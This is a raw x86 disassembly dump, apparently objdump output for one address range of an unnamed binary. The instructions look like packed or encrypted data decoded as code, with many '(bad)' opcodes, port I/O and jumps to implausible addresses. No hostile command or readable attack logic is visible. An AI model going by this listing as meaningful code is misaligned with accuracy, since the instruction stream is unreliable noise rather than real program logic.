  405f0d:	pop    ebp
  405f0e:	clc    
  405f0f:	pop    ss
  405f10:	add    DWORD PTR [ebp+0x6c],esi
  405f13:	add    edi,edi
  405f15:	fdivr  QWORD PTR [ebx-0x73]
  405f18:	hlt    
  405f19:	in     al,dx
  405f1a:	retf   
  405f1b:	mov    ds:0xc602093,al
  405f20:	out    dx,eax
  405f21:	scas   al,BYTE PTR es:[edi]
  405f22:	jo     0x405f10
  405f24:	cmc    
  405f25:	push   esp
  405f26:	push   ebx
  405f27:	js     0x405f47
  405f29:	sub    ebx,DWORD PTR [edi]
  405f2b:	je     0x405eb5
  405f2d:	or     DWORD PTR [edx-0x1a3813bd],esp
  405f33:	dec    esp
  405f34:	push   ebx
  405f35:	and    DWORD PTR [edi],edi
  405f37:	mov    dh,bh
  405f39:	ss adc al,0x76
  405f3c:	push   ebx
  405f3d:	sub    cl,dh
  405f3f:	dec    eax
  405f40:	arpl   sp,sp
  405f42:	test   DWORD PTR [edx+esi*2-0x698776b5],edi
  405f49:	pop    ebx
  405f4a:	adc    DWORD PTR ds:0xc34d,ebx
  405f4f:	pop    edi
  405f50:	(bad)  
  405f51:	cmp    edx,DWORD PTR [edx]
  405f53:	cmp    al,0x13
  405f55:	add    BYTE PTR [edx+0x3af43be1],dh
  405f5b:	out    dx,al
  405f5c:	imul   edi,DWORD PTR [esi+0x56],0x67724685
  405f63:	jmp    0x8eafc8c4
  405f68:	cli    
  405f69:	jecxz  0x405f4a
  405f6b:	adc    ebp,esi
  405f6d:	jns    0x405fec
  405f6f:	int    0x35
  405f71:	mov    bx,0x9326
  405f75:	fistp  QWORD PTR [edi-0x7734ce42]
  405f7b:	mov    eax,0x4693e9c8
  405f80:	jmp    0x405f0c
  405f82:	jae    0x405fc8
  405f84:	aaa    
  405f85:	mov    ch,0x6f
  405f87:	xchg   ebp,eax
  405f88:	loop   0x405fe4
  405f8a:	outs   dx,BYTE PTR ds:[esi]
  405f8b:	imul   BYTE PTR [ecx+0x62]
  405f8e:	inc    esp
  405f8f:	xlat   BYTE PTR ds:[ebx]
  405f90:	push   ecx
  405f91:	add    eax,0x7993b2b2
  405f96:	push   eax
  405f97:	retf   0x495d
  405f9a:	push   ds
  405f9b:	mov    eax,0x452d8861
  405fa0:	pop    edi
  405fa1:	xchg   edx,eax
  405fa2:	jnp    0x405f30
  405fa4:	leave  
  405fa5:	cwde   
  405fa6:	adc    bl,BYTE PTR [ecx-0x468622b8]
  405fac:	stos   BYTE PTR es:[edi],al
  405fad:	fwait
  405fae:	out    dx,al
  405faf:	fldenv ds:0x94c0ab0
  405fb5:	pushf  
  405fb6:	in     al,0xc7
  405fb8:	jbe    0x406033
  405fba:	call   0xe95296f3
  405fbf:	pop    ecx
  405fc0:	jle    0x405f5e
  405fc2:	cmp    al,0x74
  405fc4:	xor    eax,edx
  405fc6:	ss (bad) 
  405fc8:	cmp    ebx,ebx
  405fca:	rol    DWORD PTR [ebp-0x635edc9a],1
  405fd0:	call   0xd702:0x53bd7ada
  405fd7:	int    0x82
  405fd9:	out    dx,eax
  405fda:	in     eax,0xc6
  405fdc:	push   eax
  405fdd:	xor    DWORD PTR [edi-0x1d],eax
  405fe0:	and    al,BYTE PTR [ebp+0x61]
  405fe3:	push   0x17
  405fe5:	xchg   esp,eax
  405fe6:	fnstcw WORD PTR [esi+esi*8-0x3eee4b02]
  405fed:	loopne 0x405fcc
  405fef:	pop    edx
  405ff0:	bound  edx,QWORD PTR [ebx+ebx*8+0xd]
  405ff4:	push   ds
  405ff5:	add    dl,BYTE PTR [eax+0x7bd2c005]
  405ffb:	dec    edx
  405ffc:	inc    esi
  405ffd:	mov    DWORD PTR [ecx],ebx
  405fff:	xchg   ecx,eax
  406000:	ss addr16 xor eax,ecx
  406004:	ret    0x5138
  406007:	push   es
  406008:	xchg   DWORD PTR [ecx+0x52b701d7],esp
  40600e:	sbb    eax,0xb503f942
  406013:	xor    al,0x85
  406015:	pusha  
  406016:	pop    ecx
  406017:	mov    esp,0xd86e42a3
  40601c:	or     dl,cl
  40601e:	pop    eax
  40601f:	sti    
  406020:	shl    ah,0x3e
  406023:	popf   
  406024:	mov    ecx,0x9bf05cb8
  406029:	lds    ecx,FWORD PTR [eax+0x2e]
  40602c:	mov    cl,0xb7
  40602e:	sbb    ch,bh
  406030:	stos   BYTE PTR es:[edi],al
  406031:	push   0x2a
  406033:	enter  0xc067,0x8a
  406037:	(bad)
  40603c:	cmp    al,al
  40603e:	inc    ebp
  40603f:	mov    cl,ah
  406041:	dec    esp
  406042:	shr    DWORD PTR [eax],1
  406044:	xor    eax,0x5e9cc40b
  406049:	pop    edi
  40604a:	fidiv  WORD PTR [ebp-0x586e34c2]
  406050:	push   ss
  406051:	add    dh,bh
  406053:	fdivr  DWORD PTR [edx+0x4878a07e]
  406059:	push   ebx
  40605a:	or     DWORD PTR [ecx+0x5c],ebx
  40605d:	sub    dl,BYTE PTR [esi]
  40605f:	jg     0x40608f
  406061:	dec    ebx
  406062:	mov    DWORD PTR [edi-0x514d8821],ebx
  406068:	xchg   DWORD PTR [eax-0x55],ebx
  40606b:	cmp    al,BYTE PTR [edi+0x14eb0e69]
  406071:	adc    BYTE PTR [edi+0x0],al
  406074:	sub    BYTE PTR ds:0x33c0596e,dl
  40607a:	lock lds esp,FWORD PTR [edi-0x4d]
  40607e:	aaa    
  40607f:	lds    ecx,FWORD PTR [edi+0x682626c0]
  406085:	cli    
  406086:	jns    0x4060b8
  406088:	lahf   
  406089:	call   0x9a191bac
  40608e:	or     esi,DWORD PTR [ebx+0x65d0d28d]
  406094:	aas    
  406095:	call   0xae82:0xbc9af1a
  40609c:	and    DWORD PTR [eax],ebp
  40609e:	ret    0xe563
  4060a1:	xor    eax,0x88049f2e
  4060a6:	mul    BYTE PTR [eax]
  4060a8:	mov    eax,ds:0xd32ab05e
  4060ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ae:	div    al
  4060b0:	imul   esi,DWORD PTR [ebx+edx*4],0x14d1c4ef
  4060b7:	and    BYTE PTR [edi],bh
  4060b9:	jo     0x4060fd
  4060bb:	sub    al,0x27
  4060bd:	ds mov dh,0x37
  4060c0:	sub    eax,0xd9f88f85
  4060c5:	push   ss
  4060c6:	out    dx,al
  4060c7:	inc    edi
  4060c8:	and    ebp,ebx
  4060ca:	or     bh,BYTE PTR [edx-0x14]
  4060cd:	mov    esi,0x702c0285
  4060d2:	adc    BYTE PTR [esi+0x7deace84],bl
  4060d8:	mov    ecx,0x2b055fb4
  4060dd:	xchg   BYTE PTR [ebp-0x5fcf6c80],bl
  4060e3:	retf   0xb364
  4060e6:	push   cs
  4060e7:	dec    eax
  4060e8:	push   edx
  4060e9:	lea    edi,[eax]
  4060eb:	sti    
  4060ec:	ret    
  4060ed:	lahf   
  4060ee:	cs retf 0x89c7
  4060f2:	ficomp WORD PTR [eax+0x53dd2ece]
  4060f8:	in     eax,dx
  4060f9:	lahf   
  4060fa:	mov    esp,0x5d1383e5
  4060ff:	sub    ebx,ebx
  406101:	push   ecx
  406102:	in     al,0x7
  406104:	(bad)  
  406105:	data16 and al,0xdf
  406108:	mov    eax,0xa5dad8c5
  40610d:	sbb    eax,0x811496e2
  406112:	xchg   BYTE PTR [edi-0x1],bl
  406115:	jp     0x4060a9
  406117:	retf   
  406118:	pushf  
  406119:	fsub   DWORD PTR [edx-0x30]
  40611c:	fldenv [edx]
  40611e:	fwait
  40611f:	loope  0x4060e5
  406121:	or     al,0xd7
  406123:	dec    ecx
  406124:	xor    al,0x52
  406126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406127:	mov    esp,0xc2c3be7e
  40612c:	mov    ch,0x19
  40612e:	sub    BYTE PTR [esi],al
  406130:	in     al,0x31
  406132:	cmp    bl,BYTE PTR [edi]
  406134:	push   edi
  406135:	enter  0x289c,0x2f
  406139:	aas    
  40613a:	mov    ds:0xd2a98c8d,eax
  40613f:	daa    
  406140:	cmp    eax,0x9f73833
  406145:	inc    esi
  406146:	jbe    0x406142
  406148:	pop    ds
  406149:	pop    eax
  40614a:	fidiv  DWORD PTR [ecx]
  40614c:	into   
  40614d:	push   edx
  40614e:	hlt    
  40614f:	inc    eax
  406150:	add    al,0xb2
  406152:	cli    
  406153:	xchg   DWORD PTR [edx-0x7fd3bd5c],ecx
  406159:	imul   eax,edi,0xc41deae0
  40615f:	jb     0x4060e3
  406161:	stc    
  406162:	enter  0x2e45,0x9c
  406166:	scas   eax,DWORD PTR es:[edi]
  406167:	mov    ah,BYTE PTR [di+0x3c]
  40616b:	push   ebx
  40616c:	dec    ecx
  40616d:	and    al,0x8c
  40616f:	adc    DWORD PTR [ecx+0x1d12d263],ebx
  406175:	popa   
  406176:	lds    ecx,FWORD PTR [eax-0x1]
  406179:	(bad)  
  40617a:	adc    al,0xea
  40617c:	je     0x4061d9
  40617e:	dec    ebx
  40617f:	mov    edi,0x6f5a033
  406184:	adc    BYTE PTR [esi-0x519a1751],ah
  40618a:	sub    al,BYTE PTR [ebp-0x5eec9544]
  406190:	cmp    DWORD PTR [ecx+ecx*2+0x24911303],edi
  406197:	push   0xcb2a0394
  40619c:	xor    dh,BYTE PTR [ebx-0x344c1cac]
  4061a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061a3:	mov    al,ds:0x57d9d21
  4061a8:	cmp    eax,0x1a270cd8
  4061ad:	xchg   BYTE PTR [edx+ecx*1-0x61],ch
  4061b1:	adc    al,0x78
  4061b3:	sti    
  4061b4:	push   0x61
  4061b6:	aas    
  4061b7:	or     DWORD PTR [ebx+0x71305c1a],edx
  4061bd:	cwde   
  4061be:	in     al,dx
  4061bf:	pop    ss
  4061c0:	cld    
  4061c1:	or     dl,BYTE PTR [esi]
  4061c3:	ja     0x406151
  4061c5:	es scas eax,DWORD PTR es:[edi]
  4061c7:	daa    
  4061c8:	xchg   ch,al
  4061ca:	xor    eax,0x4f4cf0bd
  4061d0:	xchg   ebx,eax
  4061d1:	inc    eax
  4061d2:	sub    al,0x32
  4061d4:	hlt    
  4061d5:	fnstsw WORD PTR [ebx]
  4061d7:	(bad)  
  4061d8:	imul   ebx,esi,0x7526a3aa
  4061de:	imul   eax,edi,0xb849c72e
  4061e4:	std    
  4061e5:	cmp    edx,DWORD PTR [edx]
  4061e7:	out    dx,eax
  4061e8:	dec    edx
  4061e9:	mov    ah,0x2
  4061eb:	(bad)  
  4061ec:	leave  
  4061ed:	icebp  
  4061ee:	adc    al,dh
  4061f0:	into   
  4061f1:	shr    DWORD PTR [edx],0xe3
  4061f4:	and    DWORD PTR [edx],ebx
  4061f6:	outs   dx,BYTE PTR ds:[esi]
  4061f7:	fisub  DWORD PTR [ecx+0x5a]
  4061fa:	rcr    DWORD PTR [ecx],1
  4061fc:	mov    ecx,0x17ee6873
  406201:	mov    esi,0x68b32e07
  406206:	jecxz  0x406286
  406208:	jnp    0x4061c3
  40620a:	mov    fs,WORD PTR [edx]
  40620c:	retf   
  40620d:	fwait
  40620e:	xor    DWORD PTR ds:0xf62ec5c2,eax
  406214:	inc    ecx
  406215:	xchg   esp,eax
  406216:	push   ebx
  406217:	adc    al,0xb9
  406219:	scas   eax,DWORD PTR es:[edi]
  40621a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40621b:	fadd   st(1),st
  40621d:	mov    edx,DWORD PTR [ecx+0x5a]
  406220:	not    BYTE PTR [eax-0x728e8543]
  406226:	mov    ds:0x4616a042,al
  40622b:	push   DWORD PTR [eax+0x67d1daab]
  406231:	sbb    BYTE PTR [eax],al
  406233:	(bad)  
  406234:	push   0x42
  406236:	push   es
  406237:	iret   
  406238:	outs   dx,DWORD PTR ds:[esi]
  406239:	sahf   
  40623a:	aas    
  40623b:	ror    BYTE PTR [ebp-0x60],cl
  40623e:	test   al,0xb1
  406240:	loope  0x4061e7
  406242:	jbe    0x406263
  406244:	mov    bl,0xf3
  406246:	les    eax,FWORD PTR [eax-0x10]
  406249:	push   0x2791e28d
  40624e:	push   0xffffff8f
  406250:	jle    0x40621c
  406252:	ret    
  406253:	push   cs
  406254:	xor    al,dh
  406256:	clc    
  406257:	add    ch,dl
  406259:	dec    ebx
  40625a:	icebp  
  40625b:	pop    edi
  40625c:	sbb    BYTE PTR [eax-0x6adc60bc],0x0
  406263:	in     al,0x55
  406265:	dec    esp
  406266:	(bad)  
  406267:	sub    al,0x7c
  406269:	in     eax,0xbf
  40626b:	stos   DWORD PTR es:[edi],eax
  40626c:	cmc    
  40626d:	sub    eax,0xac8c59f2
  406272:	shr    esi,1
  406274:	cdq    
  406275:	mov    BYTE PTR [ebx-0x2d3bc193],cl
  40627b:	outs   dx,DWORD PTR ds:[esi]
  40627c:	nop
  40627d:	mov    eax,0x8dfcb7a1
  406282:	sub    esi,DWORD PTR [ecx+ebx*1]
  406285:	(bad)  
  406286:	sbb    DWORD PTR [edi-0x2eddbd33],edi
  40628c:	popf   
  40628d:	ror    DWORD PTR [ecx+edi*2+0x6912a6f5],1
  406294:	retf   
  406295:	mov    eax,ds:0x907a7465
  40629a:	sbb    BYTE PTR [ebx],0xb9
  40629d:	xchg   ebp,eax
  40629e:	xor    al,0xd
  4062a0:	xchg   edx,eax
  4062a1:	xchg   ebp,eax
  4062a2:	jg     0x4062d1
  4062a4:	jg     0x40628f
  4062a6:	mov    ecx,0xc64b679e
  4062ab:	icebp  
  4062ac:	jo     0x406269
  4062ae:	(bad)  
  4062af:	sub    esi,DWORD PTR [ebp-0x2a]
  4062b2:	xor    edi,DWORD PTR [ebp*8+0x24555921]
  4062b9:	jo     0x40624f
  4062bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062bc:	pusha  
  4062bd:	jg     0x406334
  4062bf:	bound  esi,QWORD PTR [edi]
  4062c1:	les    esp,FWORD PTR [eax]
  4062c3:	scas   al,BYTE PTR es:[edi]
  4062c4:	cli    
  4062c5:	mov    ecx,0xfad9aa37
  4062ca:	sub    ebx,0x40
  4062cd:	sahf   
  4062ce:	inc    ebx
  4062cf:	(bad)  
  4062d0:	(bad)  
  4062d1:	push   0x9e861881
  4062d6:	sbb    al,0xb0
  4062d8:	mov    ebp,ecx
  4062da:	or     esi,ebx
  4062dc:	dec    ebp
  4062dd:	add    BYTE PTR [esi],dh
  4062df:	cmp    BYTE PTR [ebp-0x20],0x1c
  4062e3:	add    DWORD PTR [ebp-0x2f77bcd4],0xc94ee4d8
  4062ed:	int3   
  4062ee:	push   ss
  4062ef:	outs   dx,DWORD PTR ds:[esi]
  4062f0:	fs in  eax,0x6f
  4062f3:	daa    
  4062f4:	mov    bl,0xda
  4062f6:	scas   al,BYTE PTR es:[edi]
  4062f7:	inc    ecx
  4062f8:	aam    0xd0
  4062fa:	in     al,0x95
  4062fc:	mov    ch,0xf2
  4062fe:	push   ecx
  4062ff:	icebp  
  406300:	adc    DWORD PTR [ebp+0x6ac16758],esi
  406306:	sahf   
  406307:	inc    esp
  406308:	push   ecx
  406309:	mov    ebx,0x39921ad0
  40630e:	xchg   ebx,eax
  40630f:	xchg   edx,eax
  406310:	push   DWORD PTR [edx]
  406312:	cmc    
  406313:	sbb    ebx,ecx
  406315:	mov    ds:0x312e441b,al
  40631a:	pushf  
  40631b:	loope  0x40636e
  40631d:	popf   
  40631e:	stos   BYTE PTR es:[edi],al
  40631f:	or     eax,DWORD PTR [esi-0x44feb3bf]
  406325:	dec    ecx
  406326:	xchg   esi,eax
  406328:	mov    ecx,0xe23dbe0
  40632d:	lea    edi,[edx+0x6a]
  406330:	ret    0x371e
  406333:	shl    BYTE PTR [ebp-0x35],0x54
  406337:	mov    esp,0xbb139c10
  40633c:	pop    ds
  40633d:	inc    ecx
  40633e:	out    0x35,al
  406340:	xchg   ebp,eax
  406341:	(bad)  
  406342:	arpl   cx,bp
  406344:	jl     0x40631f
  406346:	push   edx
  406347:	cmp    dh,BYTE PTR [esi-0x49]
  40634a:	pop    ds
  40634b:	loop   0x406349
  40634d:	or     al,0xfb
  40634f:	pop    esi
  406350:	jle    0x406308
  406352:	pop    ebp
  406353:	sbb    al,0x11
  406355:	cld    
  406356:	aad    0xda
  406358:	cmc    
  406359:	mov    esp,0xedde8833
  40635e:	push   cs
  40635f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406360:	sti    
  406361:	in     eax,0xbc
  406363:	call   0x4e2d8498
  406368:	ror    BYTE PTR [edi],cl
  40636a:	ins    BYTE PTR es:[edi],dx
  40636b:	jg     0x4063d4
  40636d:	mov    ecx,0xecf79dab
  406372:	mov    eax,ds:0xf4b6a8df
  406377:	mov    edi,0x5993515b
  40637c:	out    0x41,al
  40637e:	cli    
  40637f:	xchg   edx,eax
  406380:	push   edx
  406381:	shl    BYTE PTR [esi],1
  406383:	das    
  406384:	out    0xa6,eax
  406386:	cmp    BYTE PTR [ecx-0x2459c432],al
  40638c:	cwde   
  40638d:	dec    edx
  40638e:	mov    edx,0x167d6762
  406393:	enter  0xb19c,0x5f
  406397:	sub    edi,DWORD PTR [esi+0x10]
  40639a:	sbb    BYTE PTR [edx+0xd502725],dl
  4063a0:	sub    esi,DWORD PTR [esi-0x39]
  4063a3:	sub    al,0xe5
  4063a5:	aaa    
  4063a6:	stc    
  4063a7:	fucom  st(0)
  4063a9:	stos   DWORD PTR es:[edi],eax
  4063aa:	and    edx,DWORD PTR [ecx]
  4063ac:	pop    ebp
  4063ad:	and    eax,0x107bba6f
  4063b2:	cmp    edi,DWORD PTR [esi+ecx*4]
  4063b5:	xchg   edx,eax
  4063b6:	leave  
  4063b7:	or     bh,dl
  4063b9:	inc    esi
  4063ba:	add    BYTE PTR [ecx],bh
  4063bc:	jbe    0x406387
  4063be:	or     BYTE PTR [edi-0x73745c4e],ch
  4063c4:	inc    ebx
  4063c5:	enter  0x9b52,0xc9
  4063c9:	ins    DWORD PTR es:[edi],dx
  4063ca:	jno    0x4063dc
  4063cc:	imul   ecx,DWORD PTR [eax],0x6e313490
  4063d2:	push   0x9adc69ef
  4063d7:	or     edi,DWORD PTR [eax-0x27964860]
  4063dd:	cs adc al,0xa5
  4063e0:	dec    edi
  4063e1:	addr16 out dx,al
  4063e3:	lock or al,0x8a
  4063e6:	cli    
  4063e7:	sbb    ch,BYTE PTR [ebp-0x3f627675]
  4063ed:	mov    al,ds:0x35a1ebd7
  4063f2:	push   ebp
  4063f3:	stc    
  4063f4:	add    esi,DWORD PTR [esi+0x2]
  4063f7:	test   DWORD PTR [edx],eax
  4063f9:	or     ch,ah
  4063fb:	and    BYTE PTR [ebp+0x66f07a73],dl
  406401:	pop    eax
  406402:	push   ebp
  406403:	add    ecx,edi
  406405:	ja     0x40639e
  406407:	sbb    eax,0x231494b1
  40640c:	jmp    0x4063e7
  40640e:	icebp  
  40640f:	adc    al,0x35
  406411:	mov    eax,ds:0x98ebd81c
  406416:	pop    eax
  406417:	or     bl,0x81
  40641a:	push   edi
  40641b:	add    BYTE PTR [esi-0x7e],bl
  40641e:	jge    0x4063a9
  406420:	test   eax,0x23f76c41
  406425:	in     al,dx
  406426:	jle    0x4063f3
  406428:	imul   edi,ebx,0xffffffe1
  40642b:	pop    ebp
  40642c:	loope  0x4063cc
  40642e:	outs   dx,BYTE PTR ds:[esi]
  40642f:	xor    al,0x57
  406431:	fstp   QWORD PTR [ecx]
  406433:	add    bl,cl
  406435:	mov    edx,0x5b5e4b3d
  40643a:	jg     0x406480
  40643c:	xchg   esi,eax
  40643d:	xor    esi,DWORD PTR [edx+0x77406294]
  406443:	(bad)  [ebx-0x612ab544]
  406449:	and    BYTE PTR [ebx+edx*8+0x70c891d7],0xd4
  406451:	mov    ebx,0x417ae368
  406456:	int3   
  406457:	push   esi
  406458:	and    al,0x56
  40645a:	(bad)  
  40645b:	jb     0x406437
  40645d:	scas   eax,DWORD PTR es:[edi]
  40645e:	jg     0x4063f5
  406460:	test   al,ah
  406462:	mov    eax,0xacdfa33b
  406467:	mov    edi,DWORD PTR cs:[eax+0x0]
  40646b:	fist   WORD PTR [esi-0x10]
  40646e:	leave  
  40646f:	ret    0x56c6
  406472:	jmp    0xc13c0616
  406477:	jl     0x406447
  406479:	sbb    eax,0xee8c929b
  40647e:	call   0xd253:0xbbae6708
  406485:	jmp    0x35ee:0xcbef3d41
  40648c:	hlt    
  40648d:	repnz adc dl,0xcf
  406491:	mov    ch,BYTE PTR [eax]
  406493:	cmc    
  406494:	daa    
  406495:	inc    ecx
  406496:	fiadd  WORD PTR [esi+0x552f921f]
  40649c:	int    0x34
  40649e:	xlat   BYTE PTR ds:[ebx]
  40649f:	outs   dx,BYTE PTR ds:[esi]
  4064a0:	push   es
  4064a1:	jp     0x40642b
  4064a3:	addr16 aad 0x34
  4064a6:	jmp    0xf1090263
  4064ab:	push   ecx
  4064ac:	daa    
  4064ad:	cmp    esp,eax
  4064af:	sub    eax,0xa5d77cfb
  4064b4:	ja     0x40647a
  4064b6:	mov    eax,?
  4064b8:	out    dx,eax
  4064b9:	push   ebp
  4064ba:	xchg   esp,eax
  4064bb:	ins    DWORD PTR es:[edi],dx
  4064bc:	adc    ebp,DWORD PTR cs:[esi+0x51]
  4064c0:	sbb    al,0xc4
  4064c2:	mov    dh,0x78
  4064c4:	and    cl,BYTE PTR [esi-0x4a]
  4064c7:	js     0x40650f
  4064c9:	and    eax,0x4e0c12b7
  4064ce:	mov    edx,0xa2b31086
  4064d3:	enter  0x1b75,0xbe
  4064d7:	cmp    bh,ch
  4064d9:	inc    eax
  4064da:	xor    al,0xc9
  4064dc:	or     al,dh
  4064de:	sti    
  4064df:	int3   
  4064e0:	jb     0x4064c2
  4064e2:	push   cs
  4064e3:	(bad)  
  4064e4:	lock push edi
  4064e6:	xchg   ecx,eax
  4064e7:	add    BYTE PTR [eax-0x651fb091],dl
  4064ed:	add    dl,dh
  4064ef:	mov    ?,WORD PTR [esi]
  4064f1:	ins    BYTE PTR es:[edi],dx
  4064f2:	xchg   ecx,eax
  4064f3:	rcr    edi,1
  4064f5:	sbb    BYTE PTR [eax+eax*8],0x2d
  4064f9:	test   al,0xa2
  4064fb:	or     DWORD PTR [eax],0xfffffff2
  4064fe:	mov    edx,0x56c8cc8
  406503:	dec    edx
  406504:	adc    BYTE PTR [esi],ch
  406506:	push   edx
  406507:	push   ecx
  406508:	push   DWORD PTR [esi-0x566570ae]
  40650e:	sbb    bh,BYTE PTR [ebx+0x67ca5de4]
  406514:	lods   al,BYTE PTR ds:[esi]
  406515:	call   0xc7846a28
  40651a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40651b:	mov    eax,ds:0xb7fd57bf
  406520:	jecxz  0x40655c
  406522:	cmp    al,0xe5
  406524:	sub    DWORD PTR ds:0x7d88a6fd,eax
  40652a:	int3   
  40652b:	ja     0x406595
  40652d:	popa   
  40652e:	cmc    
  40652f:	lea    edx,[ebx-0x57]
  406532:	imul   edi,DWORD PTR [edi+0x2baa6fb3],0x7a
  406539:	call   0x251bd277
  40653e:	mov    edi,0x78b2e8a2
  406543:	inc    esp
  406544:	push   ebp
  406545:	mov    ah,0xec
  406547:	imul   esi,DWORD PTR [edi-0x1303d54c],0x2f
  40654e:	mov    ah,bh
  406550:	sbb    dh,BYTE PTR [ebx+0x677d4b40]
  406556:	stos   DWORD PTR es:[edi],eax
  406557:	lods   eax,DWORD PTR ds:[esi]
  406558:	xchg   ecx,eax
  406559:	fsubr  QWORD PTR [esi+0x783b110f]
  40655f:	pop    ebp
  406560:	in     eax,dx
  406561:	out    dx,al
  406562:	fimul  DWORD PTR [ecx+0x10ed1dac]
  406568:	and    eax,DWORD PTR [ebx+0x63fd441c]
  40656e:	in     eax,dx
  40656f:	cwde   
  406570:	add    al,0xda
  406572:	(bad)  
  406573:	aam    0x4d
  406575:	scas   eax,DWORD PTR es:[edi]
  406576:	int    0x96
  406578:	sbb    BYTE PTR [edi+0x6827be98],0x5
  40657f:	mov    ecx,ebx
  406581:	push   ebx
  406582:	loop   0x406575
  406584:	xchg   esp,eax
  406585:	or     al,0xd3
  406587:	add    ebp,eax
  406589:	jo     0x4065b0
  40658b:	in     eax,0xbb
  40658d:	stos   BYTE PTR es:[edi],al
  40658e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40658f:	or     ebx,DWORD PTR [eax+0x4f78b20]
  406595:	jl     0x406592
  406597:	cmp    al,0xb4
  406599:	cmp    al,0x4
  40659b:	pop    edx
  40659c:	dec    edx
  40659d:	mov    dl,0xeb
  40659f:	outs   dx,DWORD PTR ds:[esi]
  4065a0:	jp     0x406582
  4065a2:	scas   eax,DWORD PTR es:[edi]
  4065a3:	pop    esi
  4065a4:	and    ebx,edx
  4065a6:	cdq    
  4065a7:	dec    eax
  4065a8:	push   0x4aeb7015
  4065ad:	xor    DWORD PTR [ecx],ebx
  4065af:	into   
  4065b0:	and    BYTE PTR [edi+0x3d1d7955],0xe3
  4065b7:	mov    ds:0x8581da0c,eax
  4065bc:	mov    ecx,0x96932ea6
  4065c1:	add    edx,ebp
  4065c3:	scas   al,BYTE PTR es:[edi]
  4065c4:	test   eax,0x9a5367fd
  4065c9:	sbb    BYTE PTR [ecx],ah
  4065cb:	out    0xab,eax
  4065cd:	mov    ds:0x59709413,al
  4065d2:	and    eax,0xc11aa568
  4065d7:	jl     0x4065fa
  4065d9:	test   eax,0xa3d814f1
  4065de:	jl     0x4065bd
  4065e0:	sti    
  4065e1:	aad    0xfd
  4065e3:	xchg   BYTE PTR [ecx+edx*1-0x19],al
  4065e7:	call   0x317fad52
  4065ec:	fnsetpm(287 only) 
  4065ee:	aam    0xc7
  4065f0:	jmp    0x9e7:0xe410cec3
  4065f7:	or     DWORD PTR [eax+0x736cae4e],ebp
  4065fd:	adc    BYTE PTR [edx],bl
  4065ff:	push   ecx
  406600:	std    
  406601:	pop    esi
  406602:	sbb    DWORD PTR [edx],esi
  406604:	xchg   DWORD PTR [eax+0x213c801d],eax
  40660a:	mov    esi,0x8f3d7b01
  40660f:	int3   
  406610:	or     eax,ecx
  406612:	push   ebx
  406613:	aam    0xf6
  406615:	mov    WORD PTR [ecx*8+0x38d35e35],es
  40661c:	add    edi,esp
  40661e:	sti    
  40661f:	mov    dh,BYTE PTR [ecx+0xe]
  406622:	stos   BYTE PTR es:[edi],al
  406623:	pcmpgtd mm3,mm2
  406626:	mov    edi,0xc4df52db
  40662b:	xor    al,BYTE PTR [esi]
  40662d:	inc    edx
  40662e:	add    edx,DWORD PTR [edi]
  406630:	jl     0x40664c
  406632:	pushf  
  406633:	std    
  406634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406635:	out    dx,eax
  406636:	fadd   QWORD PTR [edx+ebp*4+0x6c4bb8f1]
  40663d:	adc    eax,0xe7fc2926
  406642:	push   ebp
  406643:	add    al,0x4d
  406645:	test   BYTE PTR [edx-0x24],0x34
  406649:	mul    DWORD PTR [ebx-0x43d630b7]
  40664f:	ret    
  406650:	xchg   ebp,eax
  406651:	(bad)  
  406652:	sub    esp,DWORD PTR es:[edi-0xb]
  406656:	or     BYTE PTR [eax+0x34],dl
  406659:	sbb    edx,DWORD PTR [eax-0x1b864ac5]
  40665f:	xor    eax,0x9fa4f1f5
  406664:	mov    ah,BYTE PTR es:[esp+ecx*2+0x33]
  406669:	jb     0x4065fb
  40666b:	and    eax,0xa7348fb
  406670:	sbb    DWORD PTR [esp+eiz*4+0x46d38263],esp
  406677:	in     al,0x51
  406679:	sbb    eax,0x1498ba67
  40667e:	mov    dh,0x5b
  406680:	jmp    0x12e7:0xca36ba27
  406687:	sub    ah,al
  406689:	outs   dx,DWORD PTR ds:[esi]
  40668a:	xor    bh,bh
  40668c:	pop    ebx
  40668d:	inc    ebx
  40668e:	or     ch,0xc6
  406691:	sub    BYTE PTR [ebx],ah
  406693:	hlt    
  406694:	add    al,0x32
  406696:	jmp    0xce447663
  40669b:	clc    
  40669c:	(bad)  
  40669d:	sbb    BYTE PTR [edi+0x5],al
  4066a0:	xor    cl,BYTE PTR [edx]
  4066a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a3:	or     eax,0x514936e2
  4066a8:	pop    eax
  4066a9:	jbe    0x40665e
  4066ab:	dec    ebp
  4066ac:	or     esp,eax
  4066ae:	daa    
  4066af:	repz (bad) 
  4066b2:	mov    DWORD PTR [esi+0x66a79f61],edx
  4066b8:	push   ecx
  4066b9:	loop   0x40669b
  4066bb:	mov    cl,0xd7
  4066bd:	push   0xfffffffc
  4066bf:	add    eax,DWORD PTR [eax+edx*4+0xbf57681]
  4066c6:	sbb    BYTE PTR [edx+edx*4],0xfd
  4066ca:	sbb    BYTE PTR [ecx-0x567b1d21],bl
  4066d0:	jecxz  0x406718
  4066d2:	fild   WORD PTR [ecx]
  4066d4:	push   0x2dbca725
  4066d9:	xlat   BYTE PTR ds:[ebx]
  4066da:	adc    eax,0x24bec80b
  4066df:	jp     0x406733
  4066e1:	into   
  4066e2:	push   ebp
  4066e3:	adc    eax,0xa29affbe
  4066e8:	cmp    eax,0x1a7f09e6
  4066ed:	lds    ebp,FWORD PTR [eax-0x3d]
  4066f0:	jno    0x406718
  4066f2:	jg     0x4066b7
  4066f4:	or     al,0x4c
  4066f6:	or     bl,BYTE PTR [ecx-0x13]
  4066f9:	mov    esi,0x95de6740
  4066fe:	pop    ss
  4066ff:	int    0x97
  406701:	jecxz  0x406701
  406703:	sar    BYTE PTR [edi],0xf9
  406706:	adc    eax,0x1321fb33
  40670b:	loope  0x4066f3
  40670d:	sbb    DWORD PTR [ecx+0x6eb3f34c],eax
  406713:	pop    ebp
  406714:	sbb    DWORD PTR [ebp+0x3d4d2574],edi
  40671a:	mov    dh,0x39
  40671c:	inc    eax
